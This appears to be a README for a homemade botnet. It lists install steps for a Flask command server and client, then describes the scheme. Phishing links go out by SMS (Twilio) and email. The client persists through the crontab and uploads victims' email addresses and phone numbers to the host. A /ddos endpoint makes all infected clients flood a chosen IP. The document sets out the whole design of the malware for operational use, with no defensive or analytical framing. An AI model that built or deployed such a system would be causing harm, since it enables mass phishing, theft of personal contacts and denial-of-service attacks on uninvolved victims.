# Installation

	pip install Flask
	pip install python-crontab
	python host_client.py

# Infection

Host is a flask server that accepts incomming request. New email/phone numbers are sent links to the malicious website and prompted to install the client code. The client adds itself to the client's crontab and runs every hour. All emails and phone numbers are sent to the host.

# Preform DDOS

Send a post request to <hostip>:5000/ddos with the victim's ip and count of attacks. All clients who contanct host after this command will send a request to the ip every second <count> number of times. Send a new request to <hostip>:5000/ddos with ip = '' to end the ddos attack.

# Encryption

# Communication

Twilio is used to send text messages to victims. STMP is used to send emails.
